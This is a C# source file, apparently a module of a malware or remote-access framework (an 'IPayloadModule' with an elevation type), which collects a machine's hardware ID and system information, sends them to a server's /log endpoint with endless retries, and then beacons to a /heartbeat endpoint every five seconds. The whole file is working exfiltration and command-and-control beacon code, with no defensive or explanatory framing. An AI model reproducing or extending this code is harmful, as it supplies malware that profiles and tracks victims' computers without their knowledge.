using Newtonsoft.Json;
using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace zort
{
    public class ServerCon : IPayloadModule
    {
        private const string SERVER_URL = "localhost:3000";
        private readonly Thread ServerThread = new Thread(ServerRoutine);


        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "ServerConnection";

        public async void Start()
        {
            ServerThread.Start();
        }

        public void Stop()
        {
            if(ServerThread.IsAlive)
            {
                ServerThread.Abort();
            }
        }
        private static async void ServerRoutine()
        {
            //send data to /log endpoint on startup
            //fetch /heartbeat endpoint every 5 seconds

            string HWID = SysInfoHelper.HWID();
            SystemInfo info = SysInfoHelper.Get();

        sendSysData:
            if (await LogDataAsync($"http://{SERVER_URL}/log", HWID, JsonConvert.SerializeObject(info)))
            {
                ModuleLogger.Log(typeof(ServerCon), "Log sent successfully.");
            }
            else
            {
                ModuleLogger.Log(typeof(ServerCon), "Failed to send data. Retrying in 5 seconds...");
                await Task.Delay(5000);
                goto sendSysData;
            }

        sendHeartbeat:
            await sendHeartbeat($"http://{SERVER_URL}/heartbeat", HWID);
            await Task.Delay(5000);
            goto sendHeartbeat;
        }

        static async Task<bool> LogDataAsync(string url, string hwid, string sysData)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Construct the URL with query parameters
                    var requestUrl = $"{url}?hwid={hwid}&sysData={sysData}";

                    // Send the POST request
                    HttpResponseMessage response = await client.PostAsync(requestUrl, null);

                    // Check if the response is successful
                    if (response.IsSuccessStatusCode)
                    {
                        ModuleLogger.Log(typeof(ServerCon), $"Data sent successfully: HWID = {hwid}, SysData = {sysData}");
                        return true;
                    }
                    else
                    {
                        ModuleLogger.Log(typeof(ServerCon), $"Failed to send data. Status Code: {response.StatusCode}");
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return false;
                }
            }
        }

        static async Task<bool> sendHeartbeat(string url, string hwid)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Construct the URL with query parameters
                    var requestUrl = $"{url}?hwid={hwid}";
                    // Send the POST request
                    HttpResponseMessage response = await client.GetAsync(requestUrl);
                    // Check if the response is successful
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Heartbeat sent successfully: HWID = {hwid}");
                        return true;
                    }
                    else
                    {
                        Console.WriteLine($"Failed to send heartbeat. Status Code: {response.StatusCode}");
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                    return false;
                }
            }
        }
    }
}
